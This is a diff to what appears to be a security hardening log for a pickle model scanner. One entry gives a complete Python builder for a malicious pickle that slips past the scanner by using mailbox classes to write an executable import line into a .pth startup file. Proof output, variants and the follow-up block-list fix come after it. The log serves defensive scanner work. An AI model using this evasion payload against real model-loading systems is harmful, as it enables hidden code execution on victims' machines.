@@ -6433,3 +6433,167 @@ Blocking plan:
 Performance note: three exact entries in the existing sorted policy table and
 no CSV dialect simulation, tempfile path modeling, file mode inspection, or
 broad `csv`/`tempfile` wildcard block.
+
+## Turn 117 - `mailbox` single-file `.pth` write gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using stdlib `mailbox`
+single-file mailbox writers to append attacker-controlled message bodies to an
+attacker-selected `.pth` file.
+
+Candidate payload:
+
+- Construct `mailbox.mbox(pth_path)` for an attacker-selected `.pth` path.
+- Build a message string with `builtins.str.join` from harmless fragments:
+  `"Subject: x\n\n"`, `"im"`, `"port pathlib;pathlib.Path("`,
+  `repr(marker_path)`, and `").write_text('owned-by-mailbox-mbox')\n"`.
+  No individual pickle string contains an import statement.
+- Call `mailbox.mbox.add(mailbox, message)`, then
+  `mailbox.mbox.flush(mailbox)` and `mailbox.mbox.close(mailbox)`.
+- Normal Python site processing later reads the `.pth` file. It ignores
+  mailbox framing/header lines but executes the body line that starts with
+  `import`.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return text(module) + text(name) + b"\x93"
+
+
+def tuple_for(values: list[bytes]) -> bytes:
+    if not values:
+        return b")"
+    if len(values) == 1:
+        return values[0] + b"\x85"
+    if len(values) == 2:
+        return values[0] + values[1] + b"\x86"
+    return b"(" + b"".join(values) + b"t"
+
+
+pth_path = Path("/tmp/ma_mailbox_exec.pth")
+marker = Path("/tmp/ma_mailbox_marker")
+fragments = [
+    "Subject: x\n\n",
+    "im",
+    "port pathlib;pathlib.Path(",
+    repr(str(marker)),
+    ").write_text('owned-by-mailbox-mbox')\n",
+]
+
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("mailbox", "mbox"),
+        text(str(pth_path)),
+        b"\x85R\x94",
+        sg("builtins", "str.join"),
+        text(""),
+        tuple_for([text(fragment) for fragment in fragments]),
+        b"\x86R\x94",
+        sg("mailbox", "mbox.add"),
+        b"h\x00h\x01\x86R0",
+        sg("mailbox", "mbox.flush"),
+        b"h\x00\x85R0",
+        sg("mailbox", "mbox.close"),
+        b"h\x00\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Control scanner result: `len=379`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`, `errors=[]`
+- Control coverage: `bytes_scanned=379`, `bytes_total=379`,
+  `opcode_count=36`, `raw_scan_complete=True`,
+  `opcode_scan_complete=True`
+- Control import references: `mailbox.mbox`, `builtins.str.join`,
+  `mailbox.mbox.flush`, and `mailbox.mbox.close`, all with
+  `is_dangerous=False`
+- Control runtime: `pickle.loads(control)` creates an empty `.pth` file and
+  returns `None`; `site.addsitedir(target_dir)` does not create the marker.
+- RCE scanner result: `len=406`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`, `errors=[]`
+- RCE coverage: `bytes_scanned=406`, `bytes_total=406`, `opcode_count=44`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- RCE import references: `mailbox.mbox`, `builtins.str.join`,
+  `mailbox.mbox.add`, `mailbox.mbox.flush`, and `mailbox.mbox.close`, all
+  with `is_dangerous=False`
+- String heuristic matches: `[]`
+- Before unpickle: no `.pth` file and no marker exists.
+- After `pickle.loads(payload)`: the `.pth` file exists and contains mailbox
+  framing plus the body line
+  `import pathlib;pathlib.Path('/tmp/.../ma_mailbox_marker').write_text('owned-by-mailbox-mbox')`;
+  the marker does not exist yet.
+- After normal `site.addsitedir(target_dir)`: the marker exists and contains
+  `owned-by-mailbox-mbox`.
+
+Sibling dispatch proof:
+
+| Helper sequence | Scanner verdict | Runtime result |
+| --- | --- | --- |
+| `mailbox.mbox(path)` plus `mailbox.mbox.add/flush/close` | clean, 0 findings, 0 notices | `.pth` body executes and writes `owned-by-mailbox-mbox` |
+| `mailbox.MMDF(path)` plus `mailbox.MMDF.add/flush/close` | clean, 0 findings, 0 notices | `.pth` body executes and writes `owned-by-mailbox-mmdf` |
+| `mailbox.Babyl(path)` plus `mailbox.Babyl.add/flush/close` | clean, 0 findings, 0 notices | `.pth` body executes and writes `owned-by-mailbox-babyl` |
+| `mailbox.mbox(path)` plus `mailbox._singlefileMailbox.add/flush/close` | clean, 0 findings, 0 notices | `.pth` body executes and writes `owned-by-mailbox-base` |
+
+RCE mechanism:
+
+- The single-file mailbox classes write attacker-controlled message bodies to
+  an attacker-selected path without using blocked file-opener globals.
+- `.pth` files are line-oriented. Mailbox framing, headers, and blank lines are
+  ignored by site processing until it reaches the body line starting with
+  `import`.
+- `builtins.str.join` assembles the executable body line only at runtime, so
+  no individual pickle string contains an import statement.
+- In a model-loading process, any writable directory later processed by
+  `site.addsitedir()` or present on startup can become a code-execution sink.
+
+Why the scanner missed it:
+
+- `mailbox` is not a wildcard-dangerous module.
+- `mailbox.mbox`, `mailbox.MMDF`, `mailbox.Babyl`,
+  `mailbox._singlefileMailbox.add`, `mailbox.mbox.add`,
+  `mailbox.MMDF.add`, `mailbox.Babyl.add`, and the matching flush/close
+  methods are absent from `DANGEROUS_GLOBALS`.
+- The payload uses no blocked file APIs and no suspicious magic-method names.
+- The startup hook is split across benign string fragments and written as a
+  mailbox body line at unpickle time.
+
+Performance note: the focused next block should add exact dangerous-global
+entries for the reachable write dispatch methods:
+`mailbox._singlefileMailbox.add`, `mailbox.mbox.add`, `mailbox.MMDF.add`, and
+`mailbox.Babyl.add`. Blocking the `add` methods catches the RCE-grade content
+write while avoiding broad `mailbox` wildcard blocking, mailbox format
+simulation, path modeling, or constructor-only empty-file false positives.
+
+## Turn 118 - Block mailbox single-file add dispatch
+
+Blocking plan:
+
+- Add exact dangerous-global entries for the reachable content-writing mailbox
+  dispatch methods: `mailbox._singlefileMailbox.add`, `mailbox.mbox.add`,
+  `mailbox.MMDF.add`, and `mailbox.Babyl.add`.
+- Leave `mailbox.mbox`, `mailbox.MMDF`, `mailbox.Babyl`, and the matching
+  flush/close methods allowed. Constructor-only controls still create empty
+  `.pth` files, but they do not write attacker-controlled startup-hook content.
+- Add a CPython oracle regression for all Turn 117 variants. Each control
+  payload remains clean and creates only an empty `.pth`; each active payload
+  is malicious and still writes an executable mailbox body line that normal
+  `site.addsitedir()` runs.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: four exact entries in the existing sorted policy table and
+no mailbox format simulation, path modeling, constructor blocking, or broad
+`mailbox` wildcard block.
